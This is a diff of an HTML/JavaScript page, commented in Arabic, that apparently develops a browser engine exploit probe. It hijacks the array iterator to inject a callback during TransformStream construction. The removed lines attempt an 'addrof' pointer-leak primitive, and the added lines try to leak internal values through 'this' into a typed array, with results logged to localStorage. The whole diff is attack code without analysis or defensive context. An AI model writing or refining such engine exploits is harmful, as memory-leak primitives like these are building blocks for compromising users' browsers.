@@ -3,19 +3,21 @@
 <body>
 <div id="s">Running...</div>
 <script>
-localStorage.removeItem('addrof_result');
-localStorage.removeItem('addrof_data');
+localStorage.removeItem('leak_test');
 
-let target = {};
-let buf = new ArrayBuffer(8);
-let view = new DataView(buf);
+// مصفوفة لنخزن فيها القيم المسربة
+let leaked_array = new Float64Array(4);
+leaked_array[0] = 1.1;
+leaked_array[1] = 2.2;
 
-// هذه الدالة سيتم استدعاؤها من قبل المحرك
-// سنستغل هذا الاستدعاء لكتابة شيء في buf
+// دالة سيستدعيها المحرك، وستقوم بتخزين قيمة في leaked_array
 let trap = function() {
-    // عندما يستدعيها المحرك، اكتب قيمة في buf
-    // هذه القيمة قد تكون مؤشراً داخلياً
-    view.setFloat64(0, 1.0, true);
+    // حاول قراءة this أو أي معلومة داخلية
+    try {
+        leaked_array[2] = this + 0; // قد يسبب خطأ但不crash
+    } catch(e) {
+        leaked_array[2] = 3.3;
+    }
 };
 
 try {
@@ -27,7 +29,6 @@ try {
                 if (i >= a.length) return { done: true };
                 let v = a[i];
                 if (a.length === 3 && i >= 1) {
-                    localStorage.setItem('addrof_result', 'IDX_' + i + '_TRAP_CALLED');
                     v = trap;
                 }
                 i++;
@@ -38,16 +39,15 @@ try {
 
     new TransformStream();
     
-    // اقرأ ما كتبه الـ trap في buf
-    let hex = "";
-    for (let j = 0; j < 8; j++) {
-        hex += view.getUint8(j).toString(16).padStart(2,'0') + " ";
+    // إذا وصلنا هنا، trap تم استدعاؤه
+    let result = "";
+    for (let j = 0; j < 4; j++) {
+        result += leaked_array[j] + " | ";
     }
-    localStorage.setItem('addrof_data', hex);
-    localStorage.setItem('addrof_result', 'NO_CRASH_DATA_WRITTEN');
+    localStorage.setItem('leak_test', 'SUCCESS: ' + result);
     
 } catch(e) {
-    localStorage.setItem('addrof_result', 'CAUGHT: ' + e.message);
+    localStorage.setItem('leak_test', 'CAUGHT: ' + e.message);
 }
 
 Array.prototype[Symbol.iterator] = [][Symbol.iterator];
